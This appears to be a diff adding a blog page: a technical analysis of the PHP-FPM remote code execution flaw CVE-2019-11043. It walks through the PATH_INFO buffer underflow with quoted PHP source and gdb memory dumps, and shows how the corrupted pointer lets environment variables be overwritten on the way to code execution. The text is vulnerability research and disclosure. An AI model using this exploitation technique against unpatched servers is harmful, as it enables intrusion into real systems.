@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="First of all, this is such a really interesting bug! From a small memory defect to code execution. It combines both binary and web technique so that’s why it interested me to trace into. This is just">
+<meta property="og:type" content="article">
+<meta property="og:title" content="An analysis and thought about recently PHP-FPM RCE (CVE-2019-11043)">
+<meta property="og:url" content="http://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="First of all, this is such a really interesting bug! From a small memory defect to code execution. It combines both binary and web technique so that’s why it interested me to trace into. This is just">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/25ed41355c5c976b-02.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/630b35c33f200b20-03.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/ed531d0337d510c0-04.png">
+<meta property="og:image" content="http://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/b350faa64f87945d-05.png">
+<meta property="article:published_time" content="2019-10-29T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-20T07:38:15.618Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.orange.tw/posts/2019-10-an-analysis-and-thought-about-recently/25ed41355c5c976b-02.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>An analysis and thought about recently PHP-FPM RCE (CVE-2019-11043) | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  <a class="u-url u-uid" href="/">
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <h1 class="p-name">Orange Tsai</h1>
+    </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        An analysis and thought about recently PHP-FPM RCE (CVE-2019-11043)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-10-29T16:00:00.000Z" class="dt-published" itemprop="datePublished">2019-10-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>First of all, this is such a really interesting bug! From a small memory defect to code execution. It combines both binary and web technique so that’s why it interested me to trace into. This is just a simple analysis, you can also check the <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=78599">bug report</a> and the author <a target="_blank" rel="noopener" href="https://github.com/neex/phuip-fpizdam">neex’s exploit</a> to know the original story :D  </p>
+<p>Originally, this write-up should be published earlier, but I am now traveling and don’t have enough time. Sorry for the delay :(  </p>
+<h1 id="The-root-cause"><a href="#The-root-cause" class="headerlink" title="The root cause"></a>The root cause</h1><p>PHP-FPM wrongly handles the <code>PATH_INFO</code>, which leads to a buffer underflow. Although it’s not vulnerable by default, there are still numerous vulnerable configurations that sysadmins would copy &amp; paste from Google and StackOverflow.  </p>
+<p>When the <code>fastcgi_split_path_info</code> directive is parsing a URI with newline, the <code>env_path_info</code> becomes an empty value. And due to the <code>cgi.fix_pathinfo</code>, the empty value is <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/php-7.3.10/sapi/fpm/fpm/fpm_main.c#L1151">used(fpm_main.c#L1151)</a> to calculate the real <code>path_info</code> later.  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ptlen = <span class="built_in">strlen</span>(pt);</span><br><span class="line"><span class="type">int</span> slen = len - ptlen;</span><br><span class="line"><span class="type">int</span> pilen = env_path_info ? <span class="built_in">strlen</span>(env_path_info) : <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> tflag = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> *path_info;</span><br><span class="line"><span class="keyword">if</span> (apache_was_here) &#123;</span><br><span class="line">    <span class="comment">/* recall that PATH_INFO won&#x27;t exist */</span></span><br><span class="line">    path_info = script_path_translated + ptlen;</span><br><span class="line">    tflag = (slen != <span class="number">0</span> &amp;&amp; (!orig_path_info || <span class="built_in">strcmp</span>(orig_path_info, path_info) != <span class="number">0</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    path_info = env_path_info ? env_path_info + pilen - slen : <span class="literal">NULL</span>;</span><br><span class="line">    tflag = (orig_path_info != path_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Please note that the <code>pilen</code> is zero and <code>slen</code> is the original <code>URI</code> length minus the real file-path length, so there is a buffer underflow. <code>path_info</code> can point to somewhere before it should be.  </p>
+<h1 id="The-exploitation"><a href="#The-exploitation" class="headerlink" title="The exploitation"></a>The exploitation</h1><p>With this buffer underflow, we have a limited(and small) buffer access. What can we do? The author leverages the <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/php-7.3.10/sapi/fpm/fpm/fpm_main.c#L1161">fpm_main.c#L1161</a> to do further actions.  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path_info[<span class="number">0</span>] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+
+<p>As the <code>path_info</code> points ahead of <code>PATH_INFO</code>, we can write a single null-byte to the position before <code>path_info</code>.  </p>
+<h2 id="A-From-null-byte-writing-to-CGI-environment-overwritten"><a href="#A-From-null-byte-writing-to-CGI-environment-overwritten" class="headerlink" title="A. From null-byte writing to CGI environment overwritten"></a>A. From null-byte writing to CGI environment overwritten</h2><p>OK, now we can write a single null-byte to somewhere before <code>PATH_INFO</code>, and then?  In PHP-FPM, the CGI environments are stored in <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/php-7.3.10/main/fastcgi.c#L188"><code>fcgi_data_seg</code> structure</a>, and managed by <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/php-7.3.10/main/fastcgi.c#L195">structure <code>fcgi_hash</code></a>.  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_data_seg</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>                  *pos;</span><br><span class="line">    <span class="type">char</span>                  *end;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_data_seg</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">char</span>                   data[<span class="number">1</span>];</span><br><span class="line">&#125; fcgi_data_seg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash</span> &#123;</span></span><br><span class="line">    fcgi_hash_bucket  *hash_table[FCGI_HASH_TABLE_SIZE];</span><br><span class="line">    fcgi_hash_bucket  *<span class="built_in">list</span>;</span><br><span class="line">    fcgi_hash_buckets *buckets;</span><br><span class="line">    fcgi_data_seg     *data;</span><br><span class="line">&#125; fcgi_hash;</span><br></pre></td></tr></table></figure>
+
+<p>The <code>fcgi_data_seg</code> in memory looks like:  </p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p *request.env.data</span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  pos = <span class="number">0</span>x556578555537 <span class="string">&quot;7UUxeU&quot;</span>,</span><br><span class="line">  end = <span class="number">0</span>x5565785564d8 <span class="string">&quot;&quot;</span>,</span><br><span class="line">  next = <span class="number">0</span>x556578554490,</span><br><span class="line">  data = <span class="string">&quot;P&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/<span class="number">50</span>s request.env.data.data</span><br><span class="line"><span class="number">0</span>x5565785544a8: <span class="string">&quot;FCGI_ROLE&quot;</span></span><br><span class="line"><span class="number">0</span>x5565785544b2: <span class="string">&quot;RESPONDER&quot;</span></span><br><span class="line"><span class="number">0</span>x5565785544bc: <span class="string">&quot;SCRIPT_FILENAME&quot;</span></span><br><span class="line"><span class="number">0</span>x5565785544cc: <span class="string">&quot;/var/www/html/test.php&quot;</span></span><br><span class="line"><span class="number">0</span>x5565785544e3: <span class="string">&quot;QUERY_STRING&quot;</span></span><br><span class="line"><span class="number">0</span>x5565785544f0: <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0</span>x5565785544f1: <span class="string">&quot;REQUEST_METHOD&quot;</span></span><br><span class="line"><span class="number">0</span>x556578554500: <span class="string">&quot;GET&quot;</span></span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>x556578554656: <span class="string">&quot;SERVER_NAME&quot;</span></span><br><span class="line"><span class="number">0</span>x556578554662: <span class="string">&quot;_&quot;</span></span><br><span class="line"><span class="number">0</span>x556578554664: <span class="string">&quot;REDIRECT_STATUS&quot;</span></span><br><span class="line"><span class="number">0</span>x556578554674: <span class="string">&quot;200&quot;</span></span><br><span class="line"><span class="number">0</span>x556578554678: <span class="string">&quot;PATH_INFO&quot;</span></span><br><span class="line"><span class="number">0</span>x556578554682: <span class="string">&quot;/&quot;</span>, &#x27;a&#x27; &lt;repeats <span class="number">13</span> times&gt;, <span class="string">&quot;.php&quot;</span>    &lt;--- the `path_info` points to</span><br><span class="line"><span class="number">0</span>x556578554695: <span class="string">&quot;HTTP_HOST&quot;</span></span><br><span class="line"><span class="number">0</span>x55657855469f: <span class="string">&quot;127.0.0.1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>The structure member <code>fcgi_data_seg-&gt;pos</code> points to the current buffer - <code>fcgi_data_seg-&gt;data</code> to let PHP-FPM know where to write, and <code>fcgi_data_seg-&gt;end</code> points to the buffer end. If the buffer reaches the end(<code>pos &gt; end</code>). PHP-FPM creates a new buffer and moves the previous one to the structure member <code>fcgi_data_seg-&gt;next</code>.  </p>
+<p>So, the idea is to make <code>path_info</code> points to the location of <code>fcgi_data_seg-&gt;pos</code>. Once we achieve that, we can abuse the CGI environment management! For example, here we adjust the <code>path_info</code> points to the <code>fcgi_data_seg-&gt;pos</code>.  </p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ frame</span><br><span class="line">#<span class="number">0</span>  init_request_info () at /home/orange/php-src/sapi/fpm/fpm/fpm_main.c:<span class="number">1161</span></span><br><span class="line"><span class="number">1161</span>                         path_info[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/xg path_info</span><br><span class="line"><span class="number">0</span>x5565785554c0: <span class="number">0</span>x0000556578555537</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/g request.env.data</span><br><span class="line"><span class="number">0</span>x5565785554c0: <span class="number">0</span>x0000556578555537</span><br><span class="line"></span><br><span class="line">gdb-peda$ p (fcgi_data_seg)*request.env.data</span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  pos = <span class="number">0</span>x556578555537 <span class="string">&quot;&quot;</span>,</span><br><span class="line">  end = <span class="number">0</span>x5565785564d8 <span class="string">&quot;&quot;</span>,</span><br><span class="line">  next = <span class="number">0</span>x556578554490,</span><br><span class="line">  data = <span class="string">&quot;P&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/<span class="number">15</span>s (char **)request.env.data.data</span><br><span class="line"><span class="number">0</span>x5565785554d8: <span class="string">&quot;PATH_INFO&quot;</span></span><br><span class="line"><span class="number">0</span>x5565785554e2: <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0</span>x5565785554e3: <span class="string">&quot;HTTP_HOST&quot;</span></span><br><span class="line"><span class="number">0</span>x5565785554ed: <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"><span class="number">0</span>x5565785554f7: <span class="string">&quot;HTTP_ACCEPT_ENCODING&quot;</span></span><br><span class="line"><span class="number">0</span>x55657855550c: &#x27;A&#x27; &lt;repeats <span class="number">11</span> times&gt;</span><br><span class="line"><span class="number">0</span>x556578555518: <span class="string">&quot;HTTP_LAYS&quot;</span></span><br><span class="line"><span class="number">0</span>x556578555522: <span class="string">&quot;NOGG&quot;</span></span><br><span class="line"><span class="number">0</span>x556578555527: <span class="string">&quot;ORIG_PATH_INFO&quot;</span></span><br><span class="line"><span class="number">0</span>x556578555536: <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0</span>x556578555537: <span class="string">&quot;&quot;</span>                           &lt;--- the original `request.env.data.pos`</span><br><span class="line"><span class="number">0</span>x556578555538: <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0</span>x556578555539: <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0</span>x55657855553a: <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0</span>x55657855553b: <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>This is the memory layout of <code>request.env.data</code>.  </p>
+<p><img src="/posts/2019-10-an-analysis-and-thought-about-recently/25ed41355c5c976b-02.png"></p>
+<p>Once the line <code>path_info[0] = 0;</code> has been executed, the memory layout becomes:  </p>
+<p><img src="/posts/2019-10-an-analysis-and-thought-about-recently/630b35c33f200b20-03.png">  </p>
+<p>As the <code>request.env.data.pos</code> has been written, and changed to a new location:  </p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ next</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">gdb-peda$ p (fcgi_data_seg)*request.env.data</span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  pos = <span class="number">0</span>x556578555500 <span class="string">&quot;PT_ENCODING&quot;</span>,</span><br><span class="line">  end = <span class="number">0</span>x5565785564d8 <span class="string">&quot;&quot;</span>,</span><br><span class="line">  next = <span class="number">0</span>x556578554490,</span><br><span class="line">  data = <span class="string">&quot;P&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/<span class="number">10</span>s (char **)request.env.data.pos</span><br><span class="line"><span class="number">0</span>x556578555500: <span class="string">&quot;PT_ENCODING&quot;</span></span><br><span class="line"><span class="number">0</span>x55657855550c: &#x27;A&#x27; &lt;repeats <span class="number">11</span> times&gt;</span><br><span class="line"><span class="number">0</span>x556578555518: <span class="string">&quot;HTTP_LAYS&quot;</span></span><br><span class="line"><span class="number">0</span>x556578555522: <span class="string">&quot;NOGG&quot;</span></span><br><span class="line"><span class="number">0</span>x556578555527: <span class="string">&quot;ORIG_PATH_INFO&quot;</span></span><br><span class="line"><span class="number">0</span>x556578555536: <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0</span>x556578555537: <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0</span>x556578555538: <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0</span>x556578555539: <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0</span>x55657855553a: <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>As you can see, the <code>request.env.data.pos</code> is shifted to the middle of an environment variable. The next time PHP-FPM <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/php-7.3.10/main/fastcgi.c#L1694">put a new CGI environment</a>, it will overwrite the existing one.  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FCGI_PUTENV(request, name, value) \</span></span><br><span class="line"><span class="meta"> fcgi_quick_putenv(request, name, sizeof(name)-1, FCGI_HASH_FUNC(name, sizeof(name)-1), value)</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">fcgi_putenv</span><span class="params">(fcgi_request *req, <span class="type">char</span>* var, <span class="type">int</span> var_len, <span class="type">char</span>* val)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span> (!req) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"> <span class="keyword">if</span> (val == <span class="literal">NULL</span>) &#123;</span><br><span class="line">  fcgi_hash_del(&amp;req-&gt;env, FCGI_HASH_FUNC(var, var_len), var, var_len);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> fcgi_hash_set(&amp;req-&gt;env, FCGI_HASH_FUNC(var, var_len), var, var_len, val, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strlen</span>(val));</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* <span class="title function_">fcgi_hash_set</span><span class="params">(fcgi_hash *h, <span class="type">unsigned</span> <span class="type">int</span> hash_value, <span class="type">char</span> *var, <span class="type">unsigned</span> <span class="type">int</span> var_len, <span class="type">char</span> *val, <span class="type">unsigned</span> <span class="type">int</span> val_len)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>      idx = hash_value &amp; FCGI_HASH_TABLE_MASK;</span><br><span class="line">    fcgi_hash_bucket *p = h-&gt;hash_table[idx];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    p-&gt;var = fcgi_hash_strndup(h, var, var_len);</span><br><span class="line">    p-&gt;val_len = val_len;</span><br><span class="line">    p-&gt;val = fcgi_hash_strndup(h, val, val_len);</span><br><span class="line">    <span class="keyword">return</span> p-&gt;val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">char</span>* <span class="title function_">fcgi_hash_strndup</span><span class="params">(fcgi_hash *h, <span class="type">char</span> *str, <span class="type">unsigned</span> <span class="type">int</span> str_len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    ret = h-&gt;data-&gt;pos;                             &lt;--- we have corrupted the `pos` :D</span><br><span class="line">    <span class="title function_">memcpy</span><span class="params">(ret, str, str_len)</span>;</span><br><span class="line">    ret[str_len] = <span class="number">0</span>;</span><br><span class="line">    h-&gt;data-&gt;pos += str_len + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>And it’s lucky, there is a <code>FCGI_PUTENV</code> <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/php-7.3.10/sapi/fpm/fpm/fpm_main.c#L1165">right after</a> the null-byte writing:  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">old = path_info[<span class="number">0</span>];</span><br><span class="line">path_info[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!orig_script_name ||</span><br><span class="line">    <span class="built_in">strcmp</span>(orig_script_name, env_path_info) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (orig_script_name) &#123;</span><br><span class="line">        FCGI_PUTENV(request, <span class="string">&quot;ORIG_SCRIPT_NAME&quot;</span>, orig_script_name);        &lt;--- here</span><br><span class="line">    &#125;</span><br><span class="line">    SG(request_info).request_uri = FCGI_PUTENV(request, <span class="string">&quot;SCRIPT_NAME&quot;</span>, env_path_info);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    SG(request_info).request_uri = orig_script_name;</span><br><span class="line">&#125;</span><br><span class="line">path_info[<span class="number">0</span>] = old;</span><br></pre></td></tr></table></figure>
+
+<p>It puts the name <code>ORIG_SCRIPT_NAME</code> and our controllable value into the CGI environments so that we can overwrite some important environments! …and then?  </p>
+<h2 id="B-From-CGI-environment-overwritten-to-Remote-Code-Execution"><a href="#B-From-CGI-environment-overwritten-to-Remote-Code-Execution" class="headerlink" title="B. From CGI environment overwritten to Remote Code Execution"></a>B. From CGI environment overwritten to Remote Code Execution</h2><p>Now we can overwrite environments, how to turn it into the RCE?  </p>
+<p>After the null-byte writing, the PHP-FPM <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/php-7.3.10/sapi/fpm/fpm/fpm_main.c#L1336">retrieves the environment <code>PHP_VALUE</code></a> to initial the PHP stuff. So that’s our target!  </p>
+<p>However, although we can overwrite the environment data. To forge the <code>PHP_VALUE</code> is still not easy. We can not just overwrite the existing environments key to <code>PHP_VALUE</code> and profit. After checking the source, we found the problem is PHP-FPM uses a hash table to manage environments. Without corrupting the table, we can’t insert a new environment!  </p>
+<p>PHP-FPM stores each environment variable in <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/php-7.3.10/main/fastcgi.c#L172">structure <code>fcgi_hash_bucket</code></a>.  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>              hash_value;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>              var_len;</span><br><span class="line">    <span class="type">char</span>                     *var;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>              val_len;</span><br><span class="line">    <span class="type">char</span>                     *val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_hash_bucket</span> *<span class="title">list_next</span>;</span></span><br><span class="line">&#125; fcgi_hash_bucket;</span><br></pre></td></tr></table></figure>
+
+<p>There are also <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/php-7.3.10/main/fastcgi.c#L392">some checks</a> before PHP-FPM retrieve the environment variable:  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">fcgi_hash_get</span><span class="params">(fcgi_hash *h, <span class="type">unsigned</span> <span class="type">int</span> hash_value, <span class="type">char</span> *var, <span class="type">unsigned</span> <span class="type">int</span> var_len, <span class="type">unsigned</span> <span class="type">int</span> *val_len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>      idx = hash_value &amp; FCGI_HASH_TABLE_MASK;</span><br><span class="line">    fcgi_hash_bucket *p = h-&gt;hash_table[idx];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;hash_value == hash_value &amp;&amp;</span><br><span class="line">            p-&gt;var_len == var_len &amp;&amp;</span><br><span class="line">            <span class="built_in">memcmp</span>(p-&gt;var, var, var_len) == <span class="number">0</span>) &#123;</span><br><span class="line">            *val_len = p-&gt;val_len;</span><br><span class="line">            <span class="keyword">return</span> p-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
